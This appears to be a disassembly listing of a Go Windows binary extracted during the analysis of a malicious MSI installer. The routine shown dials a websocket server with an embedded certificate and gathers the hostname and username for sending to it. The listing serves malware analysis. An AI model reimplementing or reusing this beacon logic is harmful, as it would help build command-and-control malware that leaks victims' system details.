
/home/ubuntu/malicious_msi_decode/analysis/extracted/support_v1.3/demand.exe:     file format pei-x86-64


Disassembly of section .text:

0000000140275ee0 <.text+0x274ee0>:
   140275ee0 <main.raise>:	4c 8d a4 24 a0 fe ff 	lea    r12,[rsp-0x160]
   140275ee7:	ff 
   140275ee8:	4d 3b 66 10          	cmp    r12,QWORD PTR [r14+0x10]
   140275eec:	0f 86 95 06 00 00    	jbe    0x140276587
   140275ef2:	55                   	push   rbp
   140275ef3:	48 89 e5             	mov    rbp,rsp
   140275ef6:	48 81 ec d8 01 00 00 	sub    rsp,0x1d8
   140275efd:	48 89 8c 24 f8 01 00 	mov    QWORD PTR [rsp+0x1f8],rcx
   140275f04:	00 
   140275f05:	48 89 9c 24 f0 01 00 	mov    QWORD PTR [rsp+0x1f0],rbx
   140275f0c:	00 
   140275f0d:	48 89 bc 24 00 02 00 	mov    QWORD PTR [rsp+0x200],rdi
   140275f14:	00 
   140275f15:	48 89 84 24 e8 01 00 	mov    QWORD PTR [rsp+0x1e8],rax
   140275f1c:	00 
   140275f1d:	44 0f 11 bc 24 f0 00 	movups XMMWORD PTR [rsp+0xf0],xmm15
   140275f24:	00 00 
   140275f26:	90                   	nop
   140275f27:	e8 f4 ac df ff       	call   0x140070c20 <runtime.makemap_small>
   140275f2c:	48 89 84 24 d0 01 00 	mov    QWORD PTR [rsp+0x1d0],rax
   140275f33:	00 
   140275f34:	e8 e7 ac df ff       	call   0x140070c20 <runtime.makemap_small>
   140275f39:	48 89 84 24 c8 01 00 	mov    QWORD PTR [rsp+0x1c8],rax
   140275f40:	00 
   140275f41:	48 8d 05 78 45 0c 00 	lea    rax,[rip+0xc4578]        # 0x14033a4c0 '0\x00\x00\x00\x00\x00\x00\x00(\x00\x00\x00\x00\x00\x00\x00\\x93\x03o7\x07\x08\x08\x19\x00\x00\x00\x00\x00\x00\x00\x00\\x98$>@\x01\x00\x00\x00\\x80\\xa0\x00\x00\\x80x\x07\x00:l-@\x01\x00\x00\x00 \\xa53@\x01\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00:l\x00\x00\x00\x00\x00\x00p\x00\x00\x00\x00\x00\x00\x00\x08\x17-@'
   140275f48:	e8 b3 04 da ff       	call   0x140016400 <runtime.newobject>
   140275f4d:	83 3d 6c 1e 3e 00 00 	cmp    DWORD PTR [rip+0x3e1e6c],0x0        # 0x140657dc0 ''
   140275f54:	75 12                	jne    0x140275f68
   140275f56:	48 8b 94 24 d0 01 00 	mov    rdx,QWORD PTR [rsp+0x1d0]
   140275f5d:	00 
   140275f5e:	48 8b b4 24 c8 01 00 	mov    rsi,QWORD PTR [rsp+0x1c8]
   140275f65:	00 
   140275f66:	eb 1c                	jmp    0x140275f84
   140275f68:	e8 d3 48 e0 ff       	call   0x14007a840 <runtime.gcWriteBarrier2>
   140275f6d:	48 8b 94 24 d0 01 00 	mov    rdx,QWORD PTR [rsp+0x1d0]
   140275f74:	00 
   140275f75:	49 89 13             	mov    QWORD PTR [r11],rdx
   140275f78:	48 8b b4 24 c8 01 00 	mov    rsi,QWORD PTR [rsp+0x1c8]
   140275f7f:	00 
   140275f80:	49 89 73 08          	mov    QWORD PTR [r11+0x8],rsi
   140275f84:	48 89 84 24 e8 00 00 	mov    QWORD PTR [rsp+0xe8],rax
   140275f8b:	00 
   140275f8c:	48 89 10             	mov    QWORD PTR [rax],rdx
   140275f8f:	48 89 70 20          	mov    QWORD PTR [rax+0x20],rsi
   140275f93:	48 8b 1d b6 bb 38 00 	mov    rbx,QWORD PTR [rip+0x38bbb6]        # 0x140601b50 '@w\\@\x01\x00\x00\x00\t\x07\x00\x00\x00\x00\x00\x00\t\x07\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10~e@\x01\x00\x00\x00\\xc0\\xb30@\x01\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10~e@\x01\x00\x00\x00@\\xb30@\x01\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10~e@'
   140275f9a:	48 8b 0d b7 bb 38 00 	mov    rcx,QWORD PTR [rip+0x38bbb7]        # 0x140601b58 '\t\x07\x00\x00\x00\x00\x00\x00\t\x07\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10~e@\x01\x00\x00\x00\\xc0\\xb30@\x01\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10~e@\x01\x00\x00\x00@\\xb30@\x01\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10~e@\x01\x00\x00\x00@\\xb30@'
   140275fa1:	48 8b 3d b8 bb 38 00 	mov    rdi,QWORD PTR [rip+0x38bbb8]        # 0x140601b60 '\t\x07\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10~e@\x01\x00\x00\x00\\xc0\\xb30@\x01\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10~e@\x01\x00\x00\x00@\\xb30@\x01\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10~e@\x01\x00\x00\x00@\\xb30@\x01\x00\x00\x00\x01\x00\x00\x00'
   140275fa8:	e8 93 58 f1 ff       	call   0x14018b840 <crypto/x509.(*CertPool).AppendCertsFromPEM>
   140275fad:	84 c0                	test   al,al
   140275faf:	0f 84 ec 02 00 00    	je     0x1402762a1
   140275fb5:	48 8d 05 a4 ad 0e 00 	lea    rax,[rip+0xeada4]        # 0x140360d60 '\\x88\x01\x00\x00\x00\x00\x00\x00\\x88\x01\x00\x00\x00\x00\x00\x00\\xd3(\\xe2#\x07\x08\x08\x19\x00\x00\x00\x00\x00\x00\x00\x00h%>@\x01\x00\x00\x00u\\xb5\x00\x00`s\x08\x00\\xe87-@\x01\x00\x00\x00\\xc0\r6@\x01\x00\x00\x00)\x00\x00\x00\x00\x00\x00\x00)\x00\x00\x00\x00\x00\x00\x00\\xe87\x00\x00\x00\x00\x00\x00\\xe8\x03\x00\x00\x00\x00\x00\x00x\x1c-@'
   140275fbc:	0f 1f 40 00          	nop    DWORD PTR [rax+0x0]
   140275fc0:	e8 3b 04 da ff       	call   0x140016400 <runtime.newobject>
   140275fc5:	48 89 84 24 c0 01 00 	mov    QWORD PTR [rsp+0x1c0],rax
   140275fcc:	00 
   140275fcd:	48 8d 05 ac 99 0e 00 	lea    rax,[rip+0xe99ac]        # 0x14035f980 '\\xd0\x01\x00\x00\x00\x00\x00\x00\\xc0\x01\x00\x00\x00\x00\x00\x00\x04P\\x80\\xdb\x07\x08\x08\x19\x00\x00\x00\x00\x00\x00\x00\x00\\xa8#>@\x01\x00\x00\x00\x02k\x00\x00 )\x08\x00\x1bX-@\x01\x00\x00\x00\\xe0\\xf95@\x01\x00\x00\x00#\x00\x00\x00\x00\x00\x00\x00#\x00\x00\x00\x00\x00\x00\x00\x1bX\x00\x00\x00\x00\x00\x00X\x03\x00\x00\x00\x00\x00\x00\\xae\x08-@'
   140275fd4:	e8 27 04 da ff       	call   0x140016400 <runtime.newobject>
   140275fd9:	83 3d e0 1d 3e 00 00 	cmp    DWORD PTR [rip+0x3e1de0],0x0        # 0x140657dc0 ''
   140275fe0:	75 1a                	jne    0x140275ffc
   140275fe2:	48 8b 8c 24 c0 01 00 	mov    rcx,QWORD PTR [rsp+0x1c0]
   140275fe9:	00 
   140275fea:	48 8b 9c 24 e8 00 00 	mov    rbx,QWORD PTR [rsp+0xe8]
   140275ff1:	00 
   140275ff2:	48 8b b4 24 f8 01 00 	mov    rsi,QWORD PTR [rsp+0x1f8]
   140275ff9:	00 
   140275ffa:	eb 33                	jmp    0x14027602f
   140275ffc:	48 8b 8c 24 c0 01 00 	mov    rcx,QWORD PTR [rsp+0x1c0]
   140276003:	00 
   140276004:	48 8b 91 d8 00 00 00 	mov    rdx,QWORD PTR [rcx+0xd8]
   14027600b:	e8 70 48 e0 ff       	call   0x14007a880 <runtime.gcWriteBarrier4>
   140276010:	48 8b 9c 24 e8 00 00 	mov    rbx,QWORD PTR [rsp+0xe8]
   140276017:	00 
   140276018:	49 89 1b             	mov    QWORD PTR [r11],rbx
   14027601b:	48 8b b4 24 f8 01 00 	mov    rsi,QWORD PTR [rsp+0x1f8]
   140276022:	00 
   140276023:	49 89 73 08          	mov    QWORD PTR [r11+0x8],rsi
   140276027:	49 89 43 10          	mov    QWORD PTR [r11+0x10],rax
   14027602b:	49 89 53 18          	mov    QWORD PTR [r11+0x18],rdx
   14027602f:	48 89 58 60          	mov    QWORD PTR [rax+0x60],rbx
   140276033:	48 8b 94 24 00 02 00 	mov    rdx,QWORD PTR [rsp+0x200]
   14027603a:	00 
   14027603b:	48 89 90 88 00 00 00 	mov    QWORD PTR [rax+0x88],rdx
   140276042:	48 89 b0 80 00 00 00 	mov    QWORD PTR [rax+0x80],rsi
   140276049:	66 c7 80 08 01 00 00 	mov    WORD PTR [rax+0x108],0x303
   140276050:	03 03 
   140276052:	48 89 81 d8 00 00 00 	mov    QWORD PTR [rcx+0xd8],rax
   140276059:	48 8d 05 e0 4e 0c 00 	lea    rax,[rip+0xc4ee0]        # 0x14033af40 '0\x00\x00\x00\x00\x00\x00\x00(\x00\x00\x00\x00\x00\x00\x00\\xac%\\xed\\xa6\x07\x08\x08\x19\x00\x00\x00\x00\x00\x00\x00\x00\\xd8 >@\x01\x00\x00\x00\x08\\x80\x00\x00`\\x8f\x07\x00\x00\x00\x00\x00\x00\x00\x00\x00\\xa0\\xaf3@\x01\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\\xe87\x00\x00\x00\x00\x00\x00p\x00\x00\x00\x00\x00\x00\x00mJ-@'
   140276060:	e8 9b 03 da ff       	call   0x140016400 <runtime.newobject>
   140276065:	48 8d 0d 74 fb 16 00 	lea    rcx,[rip+0x16fb74]        # 0x1403e5be0 '@\\xd40@\x01\x00\x00\x00`s5@\x01\x00\x00\x00\\xf0e\\xbf\\xed\x00\x00\x00\x00\\xe0K%@\x01\x00\x00\x00\\xc0\\xb30@\x01\x00\x00\x00\\x80s4@\x01\x00\x00\x00\\x8c=\\xb1f\x00\x00\x00\x00\\xe0D\x0f@\x01\x00\x00\x00@\\xb30@\x01\x00\x00\x00@i5@\x01\x00\x00\x00<\x10\x1b.\x00\x00\x00\x00\\x80\x15\x0f@\x01\x00\x00\x00\\xc0\\xdc0@'
   14027606c:	48 89 08             	mov    QWORD PTR [rax],rcx
   14027606f:	83 3d 4a 1d 3e 00 00 	cmp    DWORD PTR [rip+0x3e1d4a],0x0        # 0x140657dc0 ''
   140276076:	75 0a                	jne    0x140276082
   140276078:	48 8b 94 24 c0 01 00 	mov    rdx,QWORD PTR [rsp+0x1c0]
   14027607f:	00 
   140276080:	eb 10                	jmp    0x140276092
   140276082:	e8 99 47 e0 ff       	call   0x14007a820 <runtime.gcWriteBarrier1>
   140276087:	48 8b 94 24 c0 01 00 	mov    rdx,QWORD PTR [rsp+0x1c0]
   14027608e:	00 
   14027608f:	49 89 13             	mov    QWORD PTR [r11],rdx
   140276092:	48 89 84 24 18 01 00 	mov    QWORD PTR [rsp+0x118],rax
   140276099:	00 
   14027609a:	48 89 50 08          	mov    QWORD PTR [rax+0x8],rdx
   14027609e:	31 c0                	xor    eax,eax
   1402760a0:	48 8d 1d 78 ef 0e 00 	lea    rbx,[rip+0xeef78]        # 0x14036501f 'wss://objectnumberstringnetdnsdomaingophertelnetreturn.locallisten.onionip+netsocketacceptexec: hang'
   1402760a7:	b9 06 00 00 00       	mov    ecx,0x6
   1402760ac:	48 8b bc 24 e8 01 00 	mov    rdi,QWORD PTR [rsp+0x1e8]
   1402760b3:	00 
   1402760b4:	48 8b b4 24 f0 01 00 	mov    rsi,QWORD PTR [rsp+0x1f0]
   1402760bb:	00 
   1402760bc:	4c 8d 05 42 e9 0e 00 	lea    r8,[rip+0xee942]        # 0x140364a05 '/wstcp\'"\'EOF???cgodnsudpftpssh::1setNUL:\\/SunMonTueWedThuFriSatJanFebMarAprMayJunJulAugSepOctNovDecU'
   1402760c3:	41 b9 03 00 00 00    	mov    r9d,0x3
   1402760c9:	e8 72 3f de ff       	call   0x14005a040 <runtime.concatstring3>
   1402760ce:	44 0f 11 bc 24 68 01 	movups XMMWORD PTR [rsp+0x168],xmm15
   1402760d5:	00 00 
   1402760d7:	48 8d bc 24 70 01 00 	lea    rdi,[rsp+0x170]
   1402760de:	00 
   1402760df:	48 8d 7f d0          	lea    rdi,[rdi-0x30]
   1402760e3:	48 89 6c 24 f0       	mov    QWORD PTR [rsp-0x10],rbp
   1402760e8:	48 8d 6c 24 f0       	lea    rbp,[rsp-0x10]
   1402760ed:	e8 fe 4d e0 ff       	call   0x14007aef0
   1402760f2:	48 8b 6d 00          	mov    rbp,QWORD PTR [rbp+0x0]
   1402760f6:	48 8b 94 24 18 01 00 	mov    rdx,QWORD PTR [rsp+0x118]
   1402760fd:	00 
   1402760fe:	48 89 94 24 68 01 00 	mov    QWORD PTR [rsp+0x168],rdx
   140276105:	00 
   140276106:	48 89 c1             	mov    rcx,rax
   140276109:	48 89 df             	mov    rdi,rbx
   14027610c:	48 8d b4 24 68 01 00 	lea    rsi,[rsp+0x168]
   140276113:	00 
   140276114:	45 31 c0             	xor    r8d,r8d
   140276117:	45 31 c9             	xor    r9d,r9d
   14027611a:	48 8d 05 6f 23 17 00 	lea    rax,[rip+0x17236f]        # 0x1403e8490 '`\\xa11@\x01\x00\x00\x00\\xa0\\xdb3@\x01\x00\x00\x00[}\\xff\\x87\x00\x00\x00\x00\\xa0\\xc5\n@\x01\x00\x00\x00\x00\\xc6\n@\x01\x00\x00\x00@\\xc6\n@\x01\x00\x00\x00\\xe0\\xc6\n@\x01\x00\x00\x00`\\xa11@\x01\x00\x00\x00`\\xbb2@\x01\x00\x00\x00[ϠC\x00\x00\x00\x00`\\xd3\n@\x01\x00\x00\x00\\x80\\xd4\n@\x01\x00\x00\x00\\xa0\\xd5\n@'
   140276121:	48 8d 1d f8 17 3e 00 	lea    rbx,[rip+0x3e17f8]        # 0x140657920 ''
   140276128:	e8 33 bb fe ff       	call   0x140261c60 <github.com/coder/websocket.dial>
   14027612d:	48 85 c9             	test   rcx,rcx
   140276130:	0f 85 3d 01 00 00    	jne    0x140276273
   140276136:	48 89 84 24 08 01 00 	mov    QWORD PTR [rsp+0x108],rax
   14027613d:	00 
   14027613e:	48 8d 0d 3b 05 00 00 	lea    rcx,[rip+0x53b]        # 0x140276680 'I;f\x10v%UH\\x89\\xe5H\\x83\\xec\x08M\\x8bf M\\x85\\xe4u\x1bH\\x8bB\x08\x0f\x1fD\x00\x00\\xe8\x1b\\x8a\\xfe\\xffH\\x83\\xc4\x08]\\xc3\\xe8\\xd0!\\xe0\\xff\\xeb\\xceL\\x8dl$\x18M9,$u\\xdaI\\x89$$\\xeb\\xd4\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xccL\\x8d\\xa4$' <main.raise.deferwrap1>
   140276145:	48 89 8c 24 58 01 00 	mov    QWORD PTR [rsp+0x158],rcx
   14027614c:	00 
   14027614d:	48 89 84 24 60 01 00 	mov    QWORD PTR [rsp+0x160],rax
   140276154:	00 
   140276155:	48 8d 8c 24 58 01 00 	lea    rcx,[rsp+0x158]
   14027615c:	00 
   14027615d:	48 89 8c 24 c8 00 00 	mov    QWORD PTR [rsp+0xc8],rcx
   140276164:	00 
   140276165:	48 8d 84 24 b0 00 00 	lea    rax,[rsp+0xb0]
   14027616c:	00 
   14027616d:	e8 2e 74 dc ff       	call   0x14003d5a0 <runtime.deferprocStack>
   140276172:	48 8d 05 17 23 17 00 	lea    rax,[rip+0x172317]        # 0x1403e8490 '`\\xa11@\x01\x00\x00\x00\\xa0\\xdb3@\x01\x00\x00\x00[}\\xff\\x87\x00\x00\x00\x00\\xa0\\xc5\n@\x01\x00\x00\x00\x00\\xc6\n@\x01\x00\x00\x00@\\xc6\n@\x01\x00\x00\x00\\xe0\\xc6\n@\x01\x00\x00\x00`\\xa11@\x01\x00\x00\x00`\\xbb2@\x01\x00\x00\x00[ϠC\x00\x00\x00\x00`\\xd3\n@\x01\x00\x00\x00\\x80\\xd4\n@\x01\x00\x00\x00\\xa0\\xd5\n@'
   140276179:	48 8d 1d a0 17 3e 00 	lea    rbx,[rip+0x3e17a0]        # 0x140657920 ''
   140276180:	48 8b 8c 24 08 01 00 	mov    rcx,QWORD PTR [rsp+0x108]
   140276187:	00 
   140276188:	bf 02 00 00 00       	mov    edi,0x2
   14027618d:	e8 ee ee fe ff       	call   0x140265080 <github.com/coder/websocket.NetConn>
   140276192:	48 89 44 24 38       	mov    QWORD PTR [rsp+0x38],rax
   140276197:	48 89 9c 24 00 01 00 	mov    QWORD PTR [rsp+0x100],rbx
   14027619e:	00 
   14027619f:	84 00                	test   BYTE PTR [rax],al
   1402761a1:	48 8d 15 78 04 00 00 	lea    rdx,[rip+0x478]        # 0x140276620 'I;f\x10v%UH\\x89\\xe5H\\x83\\xec\x08M\\x8bf M\\x85\\xe4u\x1bH\\x8bJ\x08H\\x8bB\x10H\\x8bI\x18\\xff\\xd1H\\x83\\xc4\x08]\\xc3\\xe80"\\xe0\\xff\\xeb\\xceL\\x8dl$\x18M9,$u\\xdaI\\x89$$\\xeb\\xd4\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xccI;f\x10' <main.raise.deferwrap2>
   1402761a8:	48 89 94 24 40 01 00 	mov    QWORD PTR [rsp+0x140],rdx
   1402761af:	00 
   1402761b0:	48 89 84 24 48 01 00 	mov    QWORD PTR [rsp+0x148],rax
   1402761b7:	00 
   1402761b8:	48 89 9c 24 50 01 00 	mov    QWORD PTR [rsp+0x150],rbx
   1402761bf:	00 
   1402761c0:	48 8d 94 24 40 01 00 	lea    rdx,[rsp+0x140]
   1402761c7:	00 
   1402761c8:	48 89 94 24 98 00 00 	mov    QWORD PTR [rsp+0x98],rdx
   1402761cf:	00 
   1402761d0:	48 8d 84 24 80 00 00 	lea    rax,[rsp+0x80]
   1402761d7:	00 
   1402761d8:	e8 c3 73 dc ff       	call   0x14003d5a0 <runtime.deferprocStack>
   1402761dd:	90                   	nop
   1402761de:	66 90                	xchg   ax,ax
   1402761e0:	e8 3b 77 e6 ff       	call   0x1400dd920 <os.hostname>
   1402761e5:	48 85 c9             	test   rcx,rcx
   1402761e8:	75 5b                	jne    0x140276245
   1402761ea:	48 89 5c 24 40       	mov    QWORD PTR [rsp+0x40],rbx
   1402761ef:	48 89 84 24 10 01 00 	mov    QWORD PTR [rsp+0x110],rax
   1402761f6:	00 
   1402761f7:	48 8d 05 60 f4 0e 00 	lea    rax,[rip+0xef460]        # 0x14036565e 'USERNAMEipconfig\nERROR: https://omitzeronetedns0[::1]:53continue_gatewayshutdownwsaioctlinvalid addr'
   1402761fe:	bb 08 00 00 00       	mov    ebx,0x8
   140276203:	e8 38 25 e6 ff       	call   0x1400d8740 <os.Getenv>
   140276208:	48 85 db             	test   rbx,rbx
   14027620b:	75 11                	jne    0x14027621e
   14027620d:	48 8d 05 e4 e9 0e 00 	lea    rax,[rip+0xee9e4]        # 0x140364bf8 "USERPOST/allnullbooltruejson'\\''icmpigmpftpshttppop3smtp) = dialbindfile \r\t\nread on pipeunix.com.exe"
   140276214:	bb 04 00 00 00       	mov    ebx,0x4
   140276219:	e8 22 25 e6 ff       	call   0x1400d8740 <os.Getenv>
   14027621e:	48 8b 54 24 38       	mov    rdx,QWORD PTR [rsp+0x38]
   140276223:	48 85 d2             	test   rdx,rdx
   140276226:	0f 84 e6 00 00 00    	je     0x140276312
   14027622c:	4c 8b 4a 08          	mov    r9,QWORD PTR [rdx+0x8]
   140276230:	4c 8b 15 79 b9 38 00 	mov    r10,QWORD PTR [rip+0x38b979]        # 0x140601bb0 '\x10~e@\x01\x00\x00\x00@\\xb30@\x01\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10~e@\x01\x00\x00\x00`T1@\x01\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10~e@\x01\x00\x00\x00\\xc0\\xb30@\x01\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10~e@'
   140276237:	4d 8b 1a             	mov    r11,QWORD PTR [r10]
   14027623a:	44 8b 62 10          	mov    r12d,DWORD PTR [rdx+0x10]
   14027623e:	66 90                	xchg   ax,ax
   140276240:	e9 e0 02 00 00       	jmp    0x140276525
   140276245:	48 89 8c 24 f0 00 00 	mov    QWORD PTR [rsp+0xf0],rcx
   14027624c:	00 
   14027624d:	48 89 bc 24 f8 00 00 	mov    QWORD PTR [rsp+0xf8],rdi
   140276254:	00 
   140276255:	e8 86 78 dc ff       	call   0x14003dae0 <runtime.deferreturn>
   14027625a:	48 8b 84 24 f0 00 00 	mov    rax,QWORD PTR [rsp+0xf0]
   140276261:	00 
   140276262:	48 8b 9c 24 f8 00 00 	mov    rbx,QWORD PTR [rsp+0xf8]
   140276269:	00 
   14027626a:	48 81 c4 d8 01 00 00 	add    rsp,0x1d8
   140276271:	5d                   	pop    rbp
   140276272:	c3                   	ret
   140276273:	48 89 8c 24 f0 00 00 	mov    QWORD PTR [rsp+0xf0],rcx
   14027627a:	00 
   14027627b:	48 89 bc 24 f8 00 00 	mov    QWORD PTR [rsp+0xf8],rdi
   140276282:	00 
   140276283:	e8 58 78 dc ff       	call   0x14003dae0 <runtime.deferreturn>
   140276288:	48 8b 84 24 f0 00 00 	mov    rax,QWORD PTR [rsp+0xf0]
   14027628f:	00 
   140276290:	48 8b 9c 24 f8 00 00 	mov    rbx,QWORD PTR [rsp+0xf8]
   140276297:	00 
   140276298:	48 81 c4 d8 01 00 00 	add    rsp,0x1d8
   14027629f:	5d                   	pop    rbp
   1402762a0:	c3                   	ret
   1402762a1:	48 8d 05 38 ef 09 00 	lea    rax,[rip+0x9ef38]        # 0x1403151e0 '\x10\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\\xb7\x00\\x81\\x8e\x07\x08\x08\x19\\xa8I8@\x01\x00\x00\x00H >@\x01\x00\x00\x00-\\xe8\x00\x00 @\x03\x00\\xf0\x15-@\x01\x00\x00\x00@R1@\x01\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\\xf0\x15\x00\x00\x00\x00\x00\x00(\x00\x00\x00\x00\x00\x00\x00&\x00-@'
   1402762a8:	e8 53 01 da ff       	call   0x140016400 <runtime.newobject>
   1402762ad:	48 c7 40 08 1a 00 00 	mov    QWORD PTR [rax+0x8],0x1a
   1402762b4:	00 
   1402762b5:	48 8d 0d d4 77 0f 00 	lea    rcx,[rip+0xf77d4]        # 0x14036da90 'failed to load embedded CAreflect.Value.CanInterfacereflect.Value.OverflowUintencountered a cycle vi'
   1402762bc:	48 89 08             	mov    QWORD PTR [rax],rcx
   1402762bf:	48 8d 0d 7a f9 16 00 	lea    rcx,[rip+0x16f97a]        # 0x1403e5c40 '\\xc0\\xdc0@\x01\x00\x00\x00 @0@\x01\x00\x00\x00\\xa0\\xd23\\x8f\x00\x00\x00\x00\\xe0,\x08@\x01\x00\x00\x00@\\xb30@\x01\x00\x00\x00\\xe0\\xc35@\x01\x00\x00\x00Z\\xdd\x11\\x9f\x00\x00\x00\x00`\\xa4\r@\x01\x00\x00\x00\\xc0\\xdc0@\x01\x00\x00\x00\\x80R2@\x01\x00\x00\x00\x7fJo\\xf6\x00\x00\x00\x00\\xa0\\xc3\n@\x01\x00\x00\x00\\xc0\\xdc0@'
   1402762c6:	48 89 8c 24 f0 00 00 	mov    QWORD PTR [rsp+0xf0],rcx
   1402762cd:	00 
   1402762ce:	48 89 84 24 f8 00 00 	mov    QWORD PTR [rsp+0xf8],rax
   1402762d5:	00 
   1402762d6:	e8 05 78 dc ff       	call   0x14003dae0 <runtime.deferreturn>
   1402762db:	48 8b 84 24 f0 00 00 	mov    rax,QWORD PTR [rsp+0xf0]
   1402762e2:	00 
   1402762e3:	48 8b 9c 24 f8 00 00 	mov    rbx,QWORD PTR [rsp+0xf8]
   1402762ea:	00 
   1402762eb:	48 81 c4 d8 01 00 00 	add    rsp,0x1d8
   1402762f2:	5d                   	pop    rbp
   1402762f3:	c3                   	ret
   1402762f4:	e8 e7 77 dc ff       	call   0x14003dae0 <runtime.deferreturn>
   1402762f9:	48 8b 84 24 f0 00 00 	mov    rax,QWORD PTR [rsp+0xf0]
   140276300:	00 
   140276301:	48 8b 9c 24 f8 00 00 	mov    rbx,QWORD PTR [rsp+0xf8]
   140276308:	00 
   140276309:	48 81 c4 d8 01 00 00 	add    rsp,0x1d8
   140276310:	5d                   	pop    rbp
   140276311:	c3                   	ret
   140276312:	48 8b 8c 24 10 01 00 	mov    rcx,QWORD PTR [rsp+0x110]
   140276319:	00 
   14027631a:	48 8b 7c 24 40       	mov    rdi,QWORD PTR [rsp+0x40]
   14027631f:	48 89 c6             	mov    rsi,rax
   140276322:	49 89 d8             	mov    r8,rbx
   140276325:	48 89 d0             	mov    rax,rdx
   140276328:	48 8b 9c 24 00 01 00 	mov    rbx,QWORD PTR [rsp+0x100]
   14027632f:	00 
   140276330:	e8 2b 14 00 00       	call   0x140277760 <main.allocate>
   140276335:	48 85 c0             	test   rax,rax
   140276338:	0f 85 b4 00 00 00    	jne    0x1402763f2
   14027633e:	90                   	nop
   14027633f:	48 8d 05 3a 6e 0d 00 	lea    rax,[rip+0xd6e3a]        # 0x14034d180 "X\x00\x00\x00\x00\x00\x00\x00X\x00\x00\x00\x00\x00\x00\x00\\xf2mz3\x07\x08\x08\x19\\xf8 -@\x01\x00\x00\x00\x18'>@\x01\x00\x00\x00\\xef\\x93\x00\x00 g\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\\xe0\\xd14@\x01\x00\x00\x00\t\x00\x00\x00\x00\x00\x00\x00\t\x00\x00\x00\x00\x00\x00\x00\\xa1+\x01\x00\x00\x00\x00\x00\\xe8\x00\x00\x00\x00\x00\x00\x00\\xfe\\x93-@"
   140276346:	e8 b5 00 da ff       	call   0x140016400 <runtime.newobject>
   14027634b:	48 c7 00 00 01 00 00 	mov    QWORD PTR [rax],0x100
   140276352:	c6 40 08 01          	mov    BYTE PTR [rax+0x8],0x1
   140276356:	48 b9 00 ac 23 fc 06 	movabs rcx,0x6fc23ac00
   14027635d:	00 00 00 
   140276360:	48 89 48 10          	mov    QWORD PTR [rax+0x10],rcx
   140276364:	48 ba 00 e4 0b 54 02 	movabs rdx,0x2540be400
   14027636b:	00 00 00 
   14027636e:	48 89 50 18          	mov    QWORD PTR [rax+0x18],rdx
   140276372:	c7 40 20 00 00 04 00 	mov    DWORD PTR [rax+0x20],0x40000
   140276379:	48 ba 00 b8 64 d9 45 	movabs rdx,0x45d964b800
   140276380:	00 00 00 
   140276383:	48 89 50 30          	mov    QWORD PTR [rax+0x30],rdx
   140276387:	48 ba 00 2e 59 76 11 	movabs rdx,0x1176592e00
   14027638e:	00 00 00 
   140276391:	48 89 50 28          	mov    QWORD PTR [rax+0x28],rdx
   140276395:	48 8b 15 7c 96 39 00 	mov    rdx,QWORD PTR [rip+0x39967c]        # 0x14060fa18 ''
   14027639c:	48 8d 1d bd f8 16 00 	lea    rbx,[rip+0x16f8bd]        # 0x1403e5c60 '@\\xb30@\x01\x00\x00\x00\\xe0\\xc35@\x01\x00\x00\x00Z\\xdd\x11\\x9f\x00\x00\x00\x00`\\xa4\r@\x01\x00\x00\x00\\xc0\\xdc0@\x01\x00\x00\x00\\x80R2@\x01\x00\x00\x00\x7fJo\\xf6\x00\x00\x00\x00\\xa0\\xc3\n@\x01\x00\x00\x00\\xc0\\xdc0@\x01\x00\x00\x00\\xe0:0@\x01\x00\x00\x00\\xae3`\\xc7\x00\x00\x00\x00 \x1e\x10@\x01\x00\x00\x00\\xc0\\xdc0@'
   1402763a3:	48 89 58 38          	mov    QWORD PTR [rax+0x38],rbx
   1402763a7:	83 3d 12 1a 3e 00 00 	cmp    DWORD PTR [rip+0x3e1a12],0x0        # 0x140657dc0 ''
   1402763ae:	75 0a                	jne    0x1402763ba
   1402763b0:	48 8b 74 24 38       	mov    rsi,QWORD PTR [rsp+0x38]
   1402763b5:	48 85 f6             	test   rsi,rsi
   1402763b8:	eb 10                	jmp    0x1402763ca
   1402763ba:	e8 61 44 e0 ff       	call   0x14007a820 <runtime.gcWriteBarrier1>
   1402763bf:	49 89 13             	mov    QWORD PTR [r11],rdx
   1402763c2:	48 8b 74 24 38       	mov    rsi,QWORD PTR [rsp+0x38]
   1402763c7:	48 85 f6             	test   rsi,rsi
   1402763ca:	48 89 50 40          	mov    QWORD PTR [rax+0x40],rdx
   1402763ce:	c6 40 08 01          	mov    BYTE PTR [rax+0x8],0x1
